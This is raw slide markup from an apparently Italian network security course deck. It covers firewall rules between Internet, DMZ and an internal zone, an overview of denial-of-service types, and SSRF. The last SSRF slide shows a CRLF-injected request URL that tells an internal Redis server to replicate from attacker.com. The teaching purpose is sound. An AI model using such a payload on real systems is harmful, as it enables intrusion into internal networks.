          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5124324" y="2433650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58"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4329624" y="199107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58"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="543" idx="2"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3462574" y="3225075"/>
            <a:ext cx="0" cy="45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p58"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="544" idx="2"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7874049" y="3421950"/>
            <a:ext cx="0" cy="25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p58"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="546" idx="0"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="7054324" y="3686000"/>
            <a:ext cx="0" cy="32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2" name="Google Shape;552;p58"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2450799" y="2433650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8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1662624" y="199107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8" name="Google Shape;558;p59"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="124100" y="356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{6F0BABFE-C9E5-4584-B912-0D625FA61023}</a:tableStyleId>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="751125"/>
                <a:gridCol w="1029300"/>
                <a:gridCol w="751125"/>
                <a:gridCol w="1057125"/>
                <a:gridCol w="932750"/>
                <a:gridCol w="897550"/>
                <a:gridCol w="784850"/>
                <a:gridCol w="248967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Firewall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Src IP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Src PORT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Direction of the 1st packet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Dst IP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Dst PORT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Policy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Exo 2"/>
                          <a:ea typeface="Exo 2"/>
                          <a:cs typeface="Exo 2"/>
                          <a:sym typeface="Exo 2"/>
                        </a:rPr>
                        <a:t>Description</a:t>
                      </a:r>
                      <a:endParaRPr sz="1000"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Internet -&gt; DMZ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WS_IP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443 (HTTPS)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The webserver is publicly reachable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FW2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Default deny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FW2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Workstation_IP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Z1 → DMZ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80, 443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The workstation connects to websites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FW1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Workstation_IP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DMZ → Internet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80, 443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The workstation  connects to websites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  <a:tr h="16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FW2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Web Server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DMZ</a:t>
                      </a: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 → Z1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ANY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DB Port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ALLOW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it" sz="1000">
                          <a:solidFill>
                            <a:srgbClr val="FF0000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The application server sends email (relayed by the SMTPOut server)</a:t>
                      </a:r>
                      <a:endParaRPr i="1" sz="1000">
                        <a:solidFill>
                          <a:srgbClr val="FF0000"/>
                        </a:solidFill>
                        <a:latin typeface="Exo 2"/>
                        <a:ea typeface="Exo 2"/>
                        <a:cs typeface="Exo 2"/>
                        <a:sym typeface="Exo 2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559" name="Google Shape;559;p59"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="339611" y="1174250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9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="5400000">
            <a:off x="3336611" y="-26000"/>
            <a:ext cx="219900" cy="1307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9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="5400000">
            <a:off x="7266259" y="-455300"/>
            <a:ext cx="242100" cy="2188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9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2503211" y="116200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9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6443961" y="116188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network Z1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59"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2801836" y="812250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9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7213311" y="1009125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59"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="559" idx="0"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2339292" y="1837100"/>
            <a:ext cx="626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7" name="Google Shape;567;p59"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6342436" y="2181575"/>
            <a:ext cx="12312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9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5028036" y="599525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59"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4233336" y="156950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0" name="Google Shape;570;p59"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="564" idx="2"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3366286" y="1390950"/>
            <a:ext cx="0" cy="45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59"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="565" idx="2"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7777761" y="1587825"/>
            <a:ext cx="0" cy="25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59"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="567" idx="0"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="6958036" y="1851875"/>
            <a:ext cx="0" cy="32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3" name="Google Shape;573;p59"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2354511" y="599525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9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1566336" y="156950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0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Denial of Service (DoS)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Denial of Service (DoS)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6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Obiettivo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it"/>
              <a:t>: rendere un servizio indisponibile o non utilizzabile saturando risorse o mandandolo in errore.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-3930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Colpisce capacità limitate (CPU, memoria, rete, connessioni)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Può essere causato da un singolo punto d’origine (DoS) o da molteplici sorgenti coordinate (DDoS)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Mira alla disponibilità, uno dei pilastri fondamentali della sicurezza</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-3930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Non richiede violare l’accesso: basta impedire il funzionamento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Denial of Service (DoS)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2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="1536624"/>
            <a:ext cx="8520600" cy="49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Tipi principali di attacchi DoS (alto livello)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Saturazione delle risorse</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="it"/>
            </a:br>
            <a:r>
              <a:rPr lang="it"/>
              <a:t>L’attaccante genera più richieste o traffico di quanto il sistema possa gestire. Spesso la risorsa saturata è la banda del firewall/router.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Logici / di formato</a:t>
            </a:r>
            <a:br>
              <a:rPr b="1" lang="it"/>
            </a:br>
            <a:r>
              <a:rPr lang="it"/>
              <a:t>Input costruiti per causare errori, loop o consumi anomali (es. zip bomb o file “espansivi”).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Distribuiti (DDoS)</a:t>
            </a:r>
            <a:br>
              <a:rPr b="1" lang="it"/>
            </a:br>
            <a:r>
              <a:rPr lang="it"/>
              <a:t>Molte sorgenti indipendenti che colpiscono contemporaneamente lo stesso bersaglio.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Falsi protocollari / inconsistenza</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="it"/>
            </a:br>
            <a:r>
              <a:rPr lang="it"/>
              <a:t>Traffico che sfrutta comportamenti imprevisti nei protocolli, causando blocchi o reset.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Fattori fisici / infrastrutturali</a:t>
            </a:r>
            <a:br>
              <a:rPr b="1" lang="it"/>
            </a:br>
            <a:r>
              <a:rPr lang="it"/>
              <a:t>Interruzioni di connettività, guasti energetici o saturazione fisica della linea (non necessariamente malevole, ma con lo stesso effetto).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Server Side Request Forgery (SSRF)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Server Side Request Forgery (SSRF)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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="70949" y="30083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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="5400000">
            <a:off x="3432899" y="1808125"/>
            <a:ext cx="219900" cy="1307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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="5400000">
            <a:off x="7362547" y="1378825"/>
            <a:ext cx="242100" cy="2188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4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2599499" y="195032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4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6540249" y="1950313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network Z1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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2898124" y="2646375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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7309599" y="2843250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64"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="602" idx="0"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2070629" y="3671225"/>
            <a:ext cx="626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64"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6438724" y="4015700"/>
            <a:ext cx="12312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64"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5124324" y="2433650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64"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4329624" y="199107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64"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="607" idx="2"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3462574" y="3225075"/>
            <a:ext cx="0" cy="45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64"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="608" idx="2"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7874049" y="3421950"/>
            <a:ext cx="0" cy="25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64"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="610" idx="0"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="7054324" y="3686000"/>
            <a:ext cx="0" cy="32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64"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2450799" y="2433650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64"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1662624" y="199107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4" y="5188469"/>
            <a:ext cx="1271468" cy="12714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9" name="Google Shape;619;p64"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="618" idx="0"/>
            <a:endCxn id="602" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="1071628" y="4332569"/>
            <a:ext cx="0" cy="85590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64"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="602" idx="0"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2070629" y="3671225"/>
            <a:ext cx="5810100" cy="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64"/>
          <p:cNvCxnSpPr>
            <a:endCxn id="608" idx="2"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="7874049" y="3421950"/>
            <a:ext cx="16500" cy="25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2" name="Google Shape;622;p64"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2275450" y="3347225"/>
            <a:ext cx="648000" cy="64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623" name="Google Shape;623;p64"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4934450" y="3347225"/>
            <a:ext cx="648000" cy="6480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Server Side Request Forgery (SSRF)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65"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="70949" y="3008375"/>
            <a:ext cx="2001348" cy="1325700"/>
          </a:xfrm>
          <a:prstGeom prst="cloud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65"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="5400000">
            <a:off x="3432899" y="1808125"/>
            <a:ext cx="219900" cy="1307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65"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="5400000">
            <a:off x="7362547" y="1378825"/>
            <a:ext cx="242100" cy="2188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65"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2599499" y="195032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DMZ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65"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6540249" y="1950313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network Z1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65"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2898124" y="2646375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65"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7309599" y="2843250"/>
            <a:ext cx="11289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p65"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="629" idx="0"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2070629" y="3671225"/>
            <a:ext cx="62628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7" name="Google Shape;637;p65"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6438724" y="4015700"/>
            <a:ext cx="1231200" cy="5787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65"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5124324" y="2433650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65"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4329624" y="199107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65"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="634" idx="2"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3462574" y="3225075"/>
            <a:ext cx="0" cy="450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65"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="635" idx="2"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7874049" y="3421950"/>
            <a:ext cx="0" cy="2541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65"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="637" idx="0"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="7054324" y="3686000"/>
            <a:ext cx="0" cy="3297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65"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2450799" y="2433650"/>
            <a:ext cx="297300" cy="2637300"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CCCC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65"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1662624" y="1991075"/>
            <a:ext cx="18867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t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FW1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94" y="5188469"/>
            <a:ext cx="1271468" cy="12714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6" name="Google Shape;646;p65"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="645" idx="0"/>
            <a:endCxn id="629" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="1071628" y="4332569"/>
            <a:ext cx="0" cy="85590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7" name="Google Shape;647;p65"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="629" idx="0"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2070629" y="3671225"/>
            <a:ext cx="1288500" cy="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65"/>
          <p:cNvCxnSpPr>
            <a:endCxn id="635" idx="2"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="7874049" y="3421950"/>
            <a:ext cx="16500" cy="250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65"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="3347225" y="3228075"/>
            <a:ext cx="0" cy="44490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65"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3598450" y="3671225"/>
            <a:ext cx="4292100" cy="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65"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3598475" y="3235900"/>
            <a:ext cx="0" cy="424500"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="35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Server Side Request Forgery (SSRF)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66"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="1536624"/>
            <a:ext cx="8520600" cy="49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L’idea di base è di bypassare il firewall tramite funzionalità del web server:</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-35306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Se il web server fa qualche tipo di richiesta, allora potremmo redirezionare quella richiesta ai computer nella Z1.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FW1 lascia passare il messaggio perché diretto al web server.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/>
              <a:t>FW2 lascia passare il messaggio perché diretto al database.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 esempio pratico:</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-3530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https://translate.google.com/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it"/>
              <a:t>: se si vuole tradurre una pagina, Google translate scarica la pagina (richiesta), la traduce, e ritorna la risposta.</a:t>
            </a:r>
            <a:endParaRPr/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 alcuni casi, è possibile craftare messaggi per altri protocolli:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="it"/>
            </a:br>
            <a:r>
              <a:rPr lang="it">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
                <a:sym typeface="Consolas"/>
              </a:rPr>
              <a:t>http://sito_vulnerabile.com/send_email?to=info@example.com&amp;url=http://10.0.0.1:6379/%0D%0A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REPLICAOF%20attacker.com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%206379%0D%0A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